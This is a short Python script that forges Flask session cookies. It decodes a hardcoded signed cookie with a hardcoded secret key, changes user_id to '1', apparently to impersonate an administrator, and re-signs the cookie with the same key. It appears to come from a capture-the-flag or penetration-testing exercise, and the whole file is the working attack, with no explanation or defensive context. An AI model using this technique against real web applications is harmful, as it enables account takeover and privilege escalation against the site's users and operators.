import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.loads(cookie_str)

def encode_flask_cookie(secret_key, values):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(values)

secret_key = "a7a8342f9b41fcb062b13dd1167785f8"
cookie=".eJwlj0uKAzEMRO_idRb62JacyzSWJTEhMAPdyWqYu8cwy4J6xavfcuQZ11e5v8533Mrx8HIvTp7Gsdj6XCsGah2mjd3mcuq9kgdlS0iUKRqsDqJLSeaoPhS0dTHuMgMMWVIG7EZNGt7aIA5ssITBTZFd-gDZmVZbYiZQbmVdZx6vn2d8b58-CZOxaQ9jUUCjZgGBI_Y0oiXNSQs3977i_D9Rtfx9AABJPsg.EBLg5Q.Nz72eme0y5BEqeUp7NQtJW6a5lc"
decoded = decode_flask_cookie(secret_key, cookie)
print(decoded)
decoded["user_id"] = '1'
print(encode_flask_cookie(secret_key, decoded))
